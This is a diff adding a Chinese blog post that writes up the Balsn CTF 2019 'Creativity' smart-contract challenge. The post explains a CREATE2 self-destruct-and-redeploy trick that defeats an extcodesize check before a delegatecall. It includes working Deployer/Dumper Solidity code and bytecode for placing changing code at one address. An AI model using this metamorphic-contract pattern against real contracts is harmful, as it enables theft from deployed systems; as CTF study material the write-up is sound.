@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Balsn CTF 2019 - Creativity复现笔记 | Ainevsia Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="Balsn CTF 2019 - Creativity
+周末Retr_0师傅复现了2019Balsn CTF的Creativity，我也跟着学习了一波。出题人x9453的wp在这">
+<meta name="author" content="">
+<link rel="canonical" href="https://ainevsia.github.io/post/creativity/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.bf5f9f73cf17311d52cedbcda82c922e91b2f566d88a85ad9f5b5a08b586bd5f.css" integrity="sha256-v1&#43;fc88XMR1SztvNqCySLpGy9WbYioWtn1taCLWGvV8=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.acb54fd32bbc1982428b8850317e45d076b95012730a5936667e6bc21777692a.js" integrity="sha256-rLVP0yu8GYJCi4hQMX5F0Ha5UBJzClk2Zn5rwhd3aSo="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://ainevsia.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://ainevsia.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://ainevsia.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://ainevsia.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://ainevsia.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="Balsn CTF 2019 - Creativity复现笔记" />
+<meta property="og:description" content="Balsn CTF 2019 - Creativity
+周末Retr_0师傅复现了2019Balsn CTF的Creativity，我也跟着学习了一波。出题人x9453的wp在这" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://ainevsia.github.io/post/creativity/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2021-03-29T14:34:19+08:00" />
+<meta property="article:modified_time" content="2021-03-29T14:34:19+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Balsn CTF 2019 - Creativity复现笔记"/>
+<meta name="twitter:description" content="Balsn CTF 2019 - Creativity
+周末Retr_0师傅复现了2019Balsn CTF的Creativity，我也跟着学习了一波。出题人x9453的wp在这"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://ainevsia.github.io/post/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Balsn CTF 2019 - Creativity复现笔记",
+      "item": "https://ainevsia.github.io/post/creativity/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Balsn CTF 2019 - Creativity复现笔记",
+  "name": "Balsn CTF 2019 - Creativity复现笔记",
+  "description": "Balsn CTF 2019 - Creativity 周末Retr_0师傅复现了2019Balsn CTF的Creativity，我也跟着学习了一波。出题人x9453的wp在这\n",
+  "keywords": [
+    
+  ],
+  "articleBody": "Balsn CTF 2019 - Creativity 周末Retr_0师傅复现了2019Balsn CTF的Creativity，我也跟着学习了一波。出题人x9453的wp在这\nSource 首先查看题目给出的源码：\npragma solidity ^0.5.10; contract Creativity { event SendFlag(address addr); address public target; uint randomNumber = 0; function check(address _addr) public { uint size; assembly { size := extcodesize(_addr) } require(size \u003e 0 \u0026\u0026 size \u003c= 4); target = _addr; } function execute() public { require(target != address(0)); target.delegatecall(abi.encodeWithSignature(\"\")); selfdestruct(address(0)); } function sendFlag() public payable { require(msg.value \u003e= 100000000 ether); emit SendFlag(msg.sender); } } 分析 目标是emit SendFlag(msg.sender)，攻击点是delegatecall，可以在当前合约的上下文调用外部恶意的函数。\n但是，check规定外部合约代码不能超过4字节……\n这我还能怎么玩呢？\nCREATE2 Trick 有点TOC2TOU的意思，（time of check to time of use），先check通过然后再使用，但是check之后和使用之前数据本身发生了变化导致意想不到的后果。\nCREATE2创建的合约地址是可以通过计算事先知道的，利用这一点先部署一个4个字节以内的合约通过check，然后在use之前该地址上的合约内容，在delegatecall的时候调用实际的恶意代码。\n但是，要注意的一点是create2在同一地址上先后布置不同合约的时候需要先让上一个合约自毁，不然在一个已经有code的地址上再次create2会失败，return0。\n这里作者又是很巧秒的布置了一个0x33ff两个字节的合约，就是把msg.sender推上栈然后selfdestruct。\n示例create2合约地址\nhttps://ropsten.etherscan.io/address/0xb3ecef15f61572129089a9704b33d53f56991df8#code\n简化版本\n// SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Deployer { bytes public deployBytecode; address deployedAddr; function deploy(bytes memory code) public { deployBytecode = code; address a; // Compile Dumper to get this bytecode bytes memory dumperBytecode = hex'608060405234801561001057600080fd5b50600033905060008173ffffffffffffffffffffffffffffffffffffffff166331d191666040518163ffffffff1660e01b815260040160006040518083038186803b15801561005e57600080fd5b505afa158015610072573d6000803e3d6000fd5b505050506040513d6000823e3d601f19601f8201168201806040525081019061009b919061010d565b9050805160208201f35b60006100b86100b384610173565b61014e565b9050828152602081018484840111156100d057600080fd5b6100db8482856101a4565b509392505050565b600082601f8301126100f457600080fd5b81516101048482602086016100a5565b91505092915050565b60006020828403121561011f57600080fd5b600082015167ffffffffffffffff81111561013957600080fd5b610145848285016100e3565b91505092915050565b6000610158610169565b905061016482826101d7565b919050565b6000604051905090565b600067ffffffffffffffff82111561018e5761018d610208565b5b61019782610237565b9050602081019050919050565b60005b838110156101c25780820151818401526020810190506101a7565b838111156101d1576000848401525b50505050565b6101e082610237565b810181811067ffffffffffffffff821117156101ff576101fe610208565b5b80604052505050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b6000601f19601f830116905091905056fe'; assembly { a := create2(callvalue(), add(0x20, dumperBytecode), mload(dumperBytecode), 0x9453) } deployedAddr = a; } } contract Dumper { constructor() { Deployer dp = Deployer(msg.sender); bytes memory bytecode = dp.deployBytecode(); assembly { return (add(bytecode, 0x20), mload(bytecode)) } } } dumper编译出的字节码就是传递给create2命令要部署的新合约的字节吗，在dumper合约的构造函数里会去一个外部地址上取回实际要部署的字节码，然后return，这样create2真正部署的字节码就是dumper从外界取回来的、可控的、恶意的代码。而dumper本身是不变的，所以create2算哈希的时候也不变，能够部署到同一个地址。\nside note 还学会了public的成员变量是会自动生成getter的。\n感想 这么骚的操作手法我直接看傻了，感觉真的实在是太巧妙了，不在我这种凡人能够想的到的范畴之内。\n这么经典好玩涨姿势的题一定要专门写一篇博客记录一下。\n同时也深深感觉到自己才疏学浅，现在都已经是2021年了我才好好看了这道题，2019年大家就已经知道这种手法了，我目前的知识水平真的还是刚刚起步的阶段。\n看x9453wp的时候深感顶尖选手积累的深厚，很多资讯材料我都是第一次在他的wp里看到，比如说ethereum-magicians的论坛、 Constantinople硬分叉和EIP-1014等。\n我也顺便查了一下最近的Berlin硬分叉其实非常近了，主链预计在4月14号硬分叉，而几个测试链已经分叉完了。不知道又引入了哪些新的特性，需要好好持续追踪一下。\n",
+  "wordCount" : "178",
+  "inLanguage": "en",
+  "datePublished": "2021-03-29T14:34:19+08:00",
+  "dateModified": "2021-03-29T14:34:19+08:00",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://ainevsia.github.io/post/creativity/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Ainevsia Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://ainevsia.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://ainevsia.github.io/" accesskey="h" title="Ainevsia Blog (Alt + H)">Ainevsia Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title">
+      Balsn CTF 2019 - Creativity复现笔记
+    </h1>
+    <div class="post-meta"><span title='2021-03-29 14:34:19 +0800 CST'>March 29, 2021</span>
+
+</div>
+  </header> 
+  <div class="post-content"><h1 id="balsn-ctf-2019---creativity">Balsn CTF 2019 - Creativity<a hidden class="anchor" aria-hidden="true" href="#balsn-ctf-2019---creativity">#</a></h1>
+<p>周末<a href="http://zhaobairen.club/">Retr_0</a>师傅复现了2019Balsn CTF的Creativity，我也跟着学习了一波。出题人<code>x9453</code>的wp<a href="https://x9453.github.io/2020/01/04/Balsn-CTF-2019-Creativity/">在这</a></p>
+<h1 id="source">Source<a hidden class="anchor" aria-hidden="true" href="#source">#</a></h1>
+<p>首先查看题目给出的源码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">pragma</span> <span style="color:#a6e22e">solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0.5</span>.<span style="color:#ae81ff">10</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">Creativity</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">event</span> <span style="color:#a6e22e">SendFlag</span>(<span style="color:#a6e22e">address</span> <span style="color:#a6e22e">addr</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">address</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">target</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">uint</span> <span style="color:#a6e22e">randomNumber</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">check</span>(<span style="color:#a6e22e">address</span> <span style="color:#a6e22e">_addr</span>) <span style="color:#66d9ef">public</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">uint</span> <span style="color:#a6e22e">size</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">assembly</span> { <span style="color:#a6e22e">size</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">extcodesize</span>(<span style="color:#a6e22e">_addr</span>) }
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">size</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">size</span> <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">4</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">target</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_addr</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">execute</span>() <span style="color:#66d9ef">public</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">target</span> <span style="color:#f92672">!=</span> <span style="color:#a6e22e">address</span>(<span style="color:#ae81ff">0</span>));
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">target</span>.<span style="color:#a6e22e">delegatecall</span>(<span style="color:#a6e22e">abi</span>.<span style="color:#a6e22e">encodeWithSignature</span>(<span style="color:#e6db74">&#34;&#34;</span>));
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">selfdestruct</span>(<span style="color:#a6e22e">address</span>(<span style="color:#ae81ff">0</span>));
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">sendFlag</span>() <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">payable</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">value</span> <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">100000000</span> <span style="color:#a6e22e">ether</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">emit</span> <span style="color:#a6e22e">SendFlag</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h1 id="分析">分析<a hidden class="anchor" aria-hidden="true" href="#分析">#</a></h1>
+<p>目标是<code>emit SendFlag(msg.sender)</code>，攻击点是delegatecall，可以在当前合约的上下文调用外部恶意的函数。</p>
+<p>但是，check规定外部合约代码不能超过4字节&hellip;&hellip;</p>
+<p>这我还能怎么玩呢？</p>
+<h1 id="create2-trick">CREATE2 Trick<a hidden class="anchor" aria-hidden="true" href="#create2-trick">#</a></h1>
+<p>有点TOC2TOU的意思，（time of check to time of use），先check通过然后再使用，但是check之后和使用之前数据本身发生了变化导致意想不到的后果。</p>
+<p>CREATE2创建的合约地址是可以通过计算事先知道的，利用这一点先部署一个4个字节以内的合约通过check，然后在use之前该地址上的合约内容，在delegatecall的时候调用实际的恶意代码。</p>
+<p>但是，要注意的一点是create2在同一地址上先后布置不同合约的时候需要先让上一个合约自毁，不然在一个已经有code的地址上再次create2会失败，return0。</p>
+<p>这里作者又是很巧秒的布置了一个0x33ff两个字节的合约，就是把msg.sender推上栈然后selfdestruct。</p>
+<p>示例create2合约地址</p>
+<p><a href="https://ropsten.etherscan.io/address/0xb3ecef15f61572129089a9704b33d53f56991df8#code">https://ropsten.etherscan.io/address/0xb3ecef15f61572129089a9704b33d53f56991df8#code</a></p>
+<p>简化版本</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pragma</span> <span style="color:#a6e22e">solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0.8</span>.<span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">Deployer</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">bytes</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">deployBytecode</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">address</span> <span style="color:#a6e22e">deployedAddr</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">deploy</span>(<span style="color:#a6e22e">bytes</span> <span style="color:#a6e22e">memory</span> <span style="color:#a6e22e">code</span>) <span style="color:#66d9ef">public</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">deployBytecode</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">code</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">address</span> <span style="color:#a6e22e">a</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Compile Dumper to get this bytecode
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">bytes</span> <span style="color:#a6e22e">memory</span> <span style="color:#a6e22e">dumperBytecode</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">hex</span><span style="color:#e6db74">&#39;608060405234801561001057600080fd5b50600033905060008173ffffffffffffffffffffffffffffffffffffffff166331d191666040518163ffffffff1660e01b815260040160006040518083038186803b15801561005e57600080fd5b505afa158015610072573d6000803e3d6000fd5b505050506040513d6000823e3d601f19601f8201168201806040525081019061009b919061010d565b9050805160208201f35b60006100b86100b384610173565b61014e565b9050828152602081018484840111156100d057600080fd5b6100db8482856101a4565b509392505050565b600082601f8301126100f457600080fd5b81516101048482602086016100a5565b91505092915050565b60006020828403121561011f57600080fd5b600082015167ffffffffffffffff81111561013957600080fd5b610145848285016100e3565b91505092915050565b6000610158610169565b905061016482826101d7565b919050565b6000604051905090565b600067ffffffffffffffff82111561018e5761018d610208565b5b61019782610237565b9050602081019050919050565b60005b838110156101c25780820151818401526020810190506101a7565b838111156101d1576000848401525b50505050565b6101e082610237565b810181811067ffffffffffffffff821117156101ff576101fe610208565b5b80604052505050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b6000601f19601f830116905091905056fe&#39;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">assembly</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">a</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">create2</span>(<span style="color:#a6e22e">callvalue</span>(), <span style="color:#a6e22e">add</span>(<span style="color:#ae81ff">0x20</span>, <span style="color:#a6e22e">dumperBytecode</span>), <span style="color:#a6e22e">mload</span>(<span style="color:#a6e22e">dumperBytecode</span>), <span style="color:#ae81ff">0x9453</span>)
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">deployedAddr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">a</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">contract</span> <span style="color:#a6e22e">Dumper</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">constructor</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">Deployer</span> <span style="color:#a6e22e">dp</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Deployer</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">bytes</span> <span style="color:#a6e22e">memory</span> <span style="color:#a6e22e">bytecode</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">dp</span>.<span style="color:#a6e22e">deployBytecode</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">assembly</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> (<span style="color:#a6e22e">add</span>(<span style="color:#a6e22e">bytecode</span>, <span style="color:#ae81ff">0x20</span>), <span style="color:#a6e22e">mload</span>(<span style="color:#a6e22e">bytecode</span>))
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>dumper编译出的字节码就是传递给create2命令要部署的新合约的字节吗，在dumper合约的构造函数里会去一个外部地址上取回实际要部署的字节码，然后return，这样create2真正部署的字节码就是dumper从外界取回来的、可控的、恶意的代码。而dumper本身是不变的，所以create2算哈希的时候也不变，能够部署到同一个地址。</p>
+<h1 id="side-note">side note<a hidden class="anchor" aria-hidden="true" href="#side-note">#</a></h1>
+<p>还学会了public的成员变量是会<a href="https://docs.soliditylang.org/en/latest/contracts.html?highlight=public%20member#getter-functions">自动生成getter</a>的。</p>
+<h1 id="感想">感想<a hidden class="anchor" aria-hidden="true" href="#感想">#</a></h1>
+<p>这么骚的操作手法我直接看傻了，感觉真的实在是太巧妙了，不在我这种凡人能够想的到的范畴之内。</p>
+<p>这么经典好玩涨姿势的题一定要专门写一篇博客记录一下。</p>
+<p>同时也深深感觉到自己才疏学浅，现在都已经是2021年了我才好好看了这道题，2019年大家就已经知道这种手法了，我目前的知识水平真的还是刚刚起步的阶段。</p>
+<p>看<code>x9453</code>wp的时候深感顶尖选手积累的深厚，很多资讯材料我都是第一次在他的wp里看到，比如说<a href="https://ethereum-magicians.org/t/potential-security-implications-of-create2-eip-1014/2614">ethereum-magicians的论坛</a>、 <a href="https://blog.ethereum.org/2019/02/22/ethereum-constantinople-st-petersburg-upgrade-announcement/">Constantinople硬分叉</a>和<a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-1014.md">EIP-1014</a>等。</p>
+<p>我也顺便查了一下最近的<a href="https://blog.ethereum.org/2021/03/08/ethereum-berlin-upgrade-announcement/">Berlin硬分叉</a>其实非常近了，主链预计在4月14号硬分叉，而几个测试链已经分叉完了。不知道又引入了哪些新的特性，需要好好持续追踪一下。</p>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2023 <a href="https://ainevsia.github.io/">Ainevsia Blog</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
